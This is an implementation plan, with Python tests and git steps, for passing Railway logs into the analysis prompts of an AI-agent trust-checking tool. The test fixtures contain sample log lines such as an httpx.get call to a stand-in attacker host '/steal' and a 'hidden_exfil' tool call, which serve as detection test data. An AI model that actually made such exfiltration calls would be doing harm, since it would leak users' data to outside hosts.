# Log-Aware Specialist Analysis Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Feed Railway logs into specialist analysis prompts so specialists can see what the agent actually did (tool calls, network destinations, errors) — not just what it said in its HTTP response.

**Architecture:** Add a `log_fetcher` callable to the orchestrator, pull Railway logs once after all probes per specialist, pass logs into `build_analysis_prompt`, and store them on `SpecialistReport` as evidence.

**Tech Stack:** Python 3.11+, existing `_fetch_railway_logs` from `HostedRuntimeRunner`

---

## File Structure

```
Modify:
  src/agentgate/trust/runtime/adaptive/models.py           - Add railway_logs field to SpecialistReport
  src/agentgate/trust/runtime/adaptive/specialists/base.py  - Add railway_logs param to build_analysis_prompt
  src/agentgate/trust/runtime/adaptive/specialists/tool_exerciser.py    - Include logs in analysis prompt
  src/agentgate/trust/runtime/adaptive/specialists/egress_prober.py     - Include logs in analysis prompt
  src/agentgate/trust/runtime/adaptive/specialists/data_boundary.py     - Include logs in analysis prompt
  src/agentgate/trust/runtime/adaptive/specialists/canary_stresser.py   - Include logs in analysis prompt
  src/agentgate/trust/runtime/adaptive/specialists/behavior_consistency.py - Include logs in analysis prompt
  src/agentgate/trust/runtime/adaptive/orchestrator.py      - Pull logs after probes, pass to analysis
  src/agentgate/trust/runtime/hosted_runner.py              - Pass log_fetcher to orchestrator

Tests:
  tests/test_trust/test_specialist_base.py          - Update for new signature
  tests/test_trust/test_orchestrator.py             - Update for log_fetcher
  tests/test_trust/test_log_aware_analysis.py       - New: verify logs appear in analysis prompts
```

---

### Task 1: Add railway_logs to SpecialistReport

**Files:**
- Modify: `src/agentgate/trust/runtime/adaptive/models.py:74-85`
- Test: `tests/test_trust/test_adaptive_models.py`

- [ ] **Step 1: Write the failing test**

Add to `tests/test_trust/test_adaptive_models.py`:

```python
def test_specialist_report_stores_railway_logs() -> None:
    report = SpecialistReport(
        specialist="tool_exerciser",
        probes_sent=1,
        probes_succeeded=1,
        railway_logs="TOOL_CALL:lookup_order\nhttpx.get('https://attacker.example')",
    )
    assert "TOOL_CALL:lookup_order" in report.railway_logs
    assert report.railway_logs != ""
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_trust/test_adaptive_models.py::test_specialist_report_stores_railway_logs -v`
Expected: FAIL with `TypeError: unexpected keyword argument 'railway_logs'`

- [ ] **Step 3: Add railway_logs field to SpecialistReport**

In `src/agentgate/trust/runtime/adaptive/models.py`, add after line 81 (`severity: str = "info"`):

```python
    railway_logs: str = ""
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_trust/test_adaptive_models.py -v`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add src/agentgate/trust/runtime/adaptive/models.py tests/test_trust/test_adaptive_models.py
git commit -m "feat: add railway_logs field to SpecialistReport"
```

---

### Task 2: Update build_analysis_prompt signature and all specialists

**Files:**
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/base.py:35-36`
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/tool_exerciser.py`
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/egress_prober.py`
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/data_boundary.py`
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/canary_stresser.py`
- Modify: `src/agentgate/trust/runtime/adaptive/specialists/behavior_consistency.py`
- Test: `tests/test_trust/test_log_aware_analysis.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_trust/test_log_aware_analysis.py`:

```python
from __future__ import annotations

from agentgate.trust.runtime.adaptive.models import ContextBundle, ProbeResult
from agentgate.trust.runtime.adaptive.specialists.tool_exerciser import ToolExerciser
from agentgate.trust.runtime.adaptive.specialists.egress_prober import EgressProber
from agentgate.trust.runtime.adaptive.specialists.canary_stresser import CanaryStresser
from agentgate.trust.runtime.adaptive.specialists.data_boundary import DataBoundaryTester
from agentgate.trust.runtime.adaptive.specialists.behavior_consistency import (
    BehaviorConsistencyChecker,
)


def _make_bundle() -> ContextBundle:
    return ContextBundle(
        source_files={"agent.py": "def process(q): pass\n"},
        manifest={"agent_name": "Test"},
        static_findings=[],
        live_url="https://agent.example.com",
        canary_tokens={"FAKE_KEY": "canary123"},
        declared_tools=["lookup_order"],
        declared_domains=[],
        customer_data_access=["orders"],
        permissions=["read_orders"],
    )


def _make_results() -> list[ProbeResult]:
    return [
        ProbeResult(
            specialist="test",
            method="POST",
            path="/api/v1/chat",
            request_body={"question": "order #123"},
            status_code=200,
            response_body='{"answer": "shipped"}',
            content_type="application/json",
        )
    ]


_RAILWAY_LOGS = (
    "TOOL_CALL:lookup_order\n"
    "TOOL_CALL:hidden_exfil\n"
    "httpx.get('https://attacker.example.com/steal')\n"
)


def test_tool_exerciser_includes_logs_in_analysis() -> None:
    specialist = ToolExerciser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:lookup_order" in prompt
    assert "TOOL_CALL:hidden_exfil" in prompt
    assert "attacker.example.com" in prompt


def test_egress_prober_includes_logs_in_analysis() -> None:
    specialist = EgressProber()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "attacker.example.com" in prompt


def test_canary_stresser_includes_logs_in_analysis() -> None:
    specialist = CanaryStresser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:hidden_exfil" in prompt


def test_data_boundary_includes_logs_in_analysis() -> None:
    specialist = DataBoundaryTester()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "attacker.example.com" in prompt


def test_behavior_consistency_includes_logs_in_analysis() -> None:
    specialist = BehaviorConsistencyChecker()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:hidden_exfil" in prompt


def test_analysis_prompt_works_without_logs() -> None:
    specialist = ToolExerciser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=""
    )
    assert "shipped" in prompt
    assert "Railway logs" not in prompt.lower() or "no railway logs" in prompt.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_trust/test_log_aware_analysis.py -v`
Expected: FAIL with `TypeError: build_analysis_prompt() got an unexpected keyword argument 'railway_logs'`

- [ ] **Step 3: Update BaseSpecialist abstract method signature**

In `src/agentgate/trust/runtime/adaptive/specialists/base.py`, change line 35-36 from:

```python
    @abstractmethod
    def build_analysis_prompt(self, context: ContextBundle, results: list[ProbeResult]) -> str:
        pass
```

to:

```python
    @abstractmethod
    def build_analysis_prompt(
        self,
        context: ContextBundle,
        results: list[ProbeResult],
        railway_logs: str = "",
    ) -> str:
        pass
```

- [ ] **Step 4: Update ToolExerciser.build_analysis_prompt**

Read the current file, then update its `build_analysis_prompt` method to accept `railway_logs: str = ""` and append a logs section:

```python
    def build_analysis_prompt(
        self,
        context: ContextBundle,
        results: list[ProbeResult],
        railway_logs: str = "",
    ) -> str:
```

At the end of the prompt string, before the JSON response instruction, add:

```python
        logs_section = ""
        if railway_logs.strip():
            logs_section = (
                f"\n\nRailway logs captured during probing "
                f"(shows what the agent ACTUALLY did behind the scenes):\n"
                f"```\n{railway_logs.strip()}\n```\n\n"
                "IMPORTANT: These logs reveal the agent's real behavior — tool calls, "
                "network requests, errors — regardless of what the HTTP response said. "
                "Cross-reference the logs against the probe responses.\n"
            )
```

Include `logs_section` in the returned prompt string.

- [ ] **Step 5: Update EgressProber.build_analysis_prompt the same way**

Same pattern: add `railway_logs: str = ""` param, add logs section to prompt.

- [ ] **Step 6: Update DataBoundaryTester.build_analysis_prompt the same way**

Same pattern.

- [ ] **Step 7: Update CanaryStresser.build_analysis_prompt the same way**

Same pattern.

- [ ] **Step 8: Update BehaviorConsistencyChecker.build_analysis_prompt the same way**

Same pattern.

- [ ] **Step 9: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_trust/test_log_aware_analysis.py -v`
Expected: All 6 PASS

- [ ] **Step 10: Run full test suite**

Run: `python3 -m pytest tests/ -q --tb=short --ignore=tests/test_integration --ignore=tests/test_reports`
Expected: All PASS (existing tests still work since `railway_logs=""` is the default)

- [ ] **Step 11: Commit**

```bash
git add src/agentgate/trust/runtime/adaptive/specialists/ tests/test_trust/test_log_aware_analysis.py
git commit -m "feat: include Railway logs in specialist analysis prompts"
```

---

### Task 3: Wire log fetcher into orchestrator

**Files:**
- Modify: `src/agentgate/trust/runtime/adaptive/orchestrator.py`
- Test: `tests/test_trust/test_orchestrator.py`

- [ ] **Step 1: Write the failing test**

Add to `tests/test_trust/test_orchestrator.py`:

```python
def test_orchestrator_passes_logs_to_analysis() -> None:
    orchestrator = AdaptiveProbeOrchestrator(api_key="test-key")
    bundle = _make_bundle()

    generation_response = json.dumps({
        "probes": [
            {
                "method": "POST",
                "path": "/api/v1/chat",
                "body": {"question": "Order #123?"},
                "rationale": "test",
            }
        ]
    })
    analysis_response = json.dumps({
        "findings": ["Hidden tool call detected"],
        "evidence": ["TOOL_CALL:hidden_exfil in logs"],
        "severity": "critical",
    })

    mock_client = _mock_anthropic_client([generation_response, analysis_response])

    mock_http_response = MagicMock()
    mock_http_response.status_code = 200
    mock_http_response.text = '{"answer": "shipped"}'
    mock_http_response.headers = {"content-type": "application/json"}

    railway_logs = "TOOL_CALL:lookup_order\nTOOL_CALL:hidden_exfil\n"

    with patch.object(
        orchestrator, "_get_client", return_value=mock_client
    ), patch("httpx.Client") as MockHTTPClient:
        mock_http = MagicMock()
        mock_http.__enter__ = MagicMock(return_value=mock_http)
        mock_http.__exit__ = MagicMock(return_value=False)
        mock_http.request.return_value = mock_http_response
        MockHTTPClient.return_value = mock_http

        report = orchestrator._run_specialist(
            "tool_exerciser", bundle, log_fetcher=lambda: railway_logs
        )

    assert report.railway_logs == railway_logs
    # Verify the analysis prompt included the logs
    analysis_call = mock_client.messages.create.call_args_list[-1]
    analysis_prompt = analysis_call[1]["messages"][0]["content"]
    assert "TOOL_CALL:hidden_exfil" in analysis_prompt


def test_orchestrator_works_without_log_fetcher() -> None:
    orchestrator = AdaptiveProbeOrchestrator(api_key="test-key")
    bundle = _make_bundle()

    generation_response = json.dumps({
        "probes": [
            {
                "method": "POST",
                "path": "/api/v1/chat",
                "body": {"question": "test"},
                "rationale": "test",
            }
        ]
    })
    analysis_response = json.dumps({
        "findings": [],
        "evidence": [],
        "severity": "info",
    })

    mock_client = _mock_anthropic_client([generation_response, analysis_response])

    mock_http_response = MagicMock()
    mock_http_response.status_code = 200
    mock_http_response.text = '{"answer": "ok"}'
    mock_http_response.headers = {"content-type": "application/json"}

    with patch.object(
        orchestrator, "_get_client", return_value=mock_client
    ), patch("httpx.Client") as MockHTTPClient:
        mock_http = MagicMock()
        mock_http.__enter__ = MagicMock(return_value=mock_http)
        mock_http.__exit__ = MagicMock(return_value=False)
        mock_http.request.return_value = mock_http_response
        MockHTTPClient.return_value = mock_http

        report = orchestrator._run_specialist("tool_exerciser", bundle)

    assert report.railway_logs == ""
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_trust/test_orchestrator.py::test_orchestrator_passes_logs_to_analysis -v`
Expected: FAIL with `TypeError: _run_specialist() got an unexpected keyword argument 'log_fetcher'`

- [ ] **Step 3: Update orchestrator.run() and _run_specialist()**

In `src/agentgate/trust/runtime/adaptive/orchestrator.py`:

Update `run()` to accept `log_fetcher`:

```python
    def run(
        self,
        bundle: ContextBundle,
        log_fetcher: Callable[[], str] | None = None,
    ) -> tuple[list[dict], list[SpecialistReport]]:
```

Add `from typing import Callable` to imports.

Pass `log_fetcher` through `_execute_phase` → `_execute_parallel`/`_execute_sequential` → `_run_specialist`.

Update `_run_specialist` signature:

```python
    def _run_specialist(
        self,
        name: str,
        bundle: ContextBundle,
        log_fetcher: Callable[[], str] | None = None,
    ) -> SpecialistReport:
```

After `results = specialist.execute_probes(probes, bundle.live_url)`, add:

```python
        # Pull Railway logs after probes executed
        railway_logs = ""
        if log_fetcher is not None:
            try:
                railway_logs = log_fetcher()
            except Exception as exc:
                logger.warning("Log fetcher failed for specialist %s: %s", name, exc)
```

Update the analysis call:

```python
        analysis_prompt = specialist.build_analysis_prompt(
            sliced_bundle, results, railway_logs=railway_logs
        )
```

After filling in report fields, add:

```python
        report.railway_logs = railway_logs
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_trust/test_orchestrator.py -v`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add src/agentgate/trust/runtime/adaptive/orchestrator.py tests/test_trust/test_orchestrator.py
git commit -m "feat: wire log fetcher into orchestrator and specialist analysis"
```

---

### Task 4: Pass log_fetcher from HostedRuntimeRunner

**Files:**
- Modify: `src/agentgate/trust/runtime/hosted_runner.py`
- Test: `tests/test_trust/test_hosted_runner_adaptive.py`

- [ ] **Step 1: Write the failing test**

Add to `tests/test_trust/test_hosted_runner_adaptive.py`:

```python
def test_adaptive_probing_passes_log_fetcher(tmp_path: Path) -> None:
    runner = HostedRuntimeRunner(
        base_url="https://agent.example.com",
        adaptive_api_key="test-key",
        source_dir=tmp_path,
        manifest={"agent_name": "Test", "declared_tools": ["lookup"]},
        railway_workspace_dir=tmp_path,
        railway_service="test-service",
    )

    mock_responses = [
        {
            "method": "POST",
            "path": "/api/v1/chat",
            "status_code": 200,
            "body_snippet": '{"answer": "hello"}',
            "content_type": "application/json",
            "error": "",
            "specialist": "tool_exerciser",
            "request_body": {"question": "test"},
        }
    ]
    mock_reports = []

    with patch(
        "agentgate.trust.runtime.hosted_runner.AdaptiveProbeOrchestrator"
    ) as MockOrch:
        mock_instance = MockOrch.return_value
        mock_instance.run.return_value = (mock_responses, mock_reports)

        from agentgate.trust.runtime.canary_bank import CanaryBank
        bank = CanaryBank()
        runner._probe_adaptive(bank)

    # Verify orchestrator.run was called with a log_fetcher
    call_kwargs = mock_instance.run.call_args
    assert "log_fetcher" in call_kwargs[1] or (
        len(call_kwargs[0]) > 1 and callable(call_kwargs[0][1])
    )
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_trust/test_hosted_runner_adaptive.py::test_adaptive_probing_passes_log_fetcher -v`
Expected: FAIL (log_fetcher not passed yet)

- [ ] **Step 3: Update _probe_adaptive in hosted_runner.py**

In `src/agentgate/trust/runtime/hosted_runner.py`, in `_probe_adaptive`, change the orchestrator.run call from:

```python
            adaptive_responses, specialist_reports = orchestrator.run(bundle)
```

to:

```python
            adaptive_responses, specialist_reports = orchestrator.run(
                bundle,
                log_fetcher=self._fetch_railway_logs,
            )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_trust/test_hosted_runner_adaptive.py -v`
Expected: All PASS

- [ ] **Step 5: Run full test suite**

Run: `python3 -m pytest tests/ -q --tb=short --ignore=tests/test_integration --ignore=tests/test_reports`
Expected: All PASS

- [ ] **Step 6: Commit**

```bash
git add src/agentgate/trust/runtime/hosted_runner.py tests/test_trust/test_hosted_runner_adaptive.py
git commit -m "feat: pass Railway log fetcher from hosted runner to orchestrator"
```
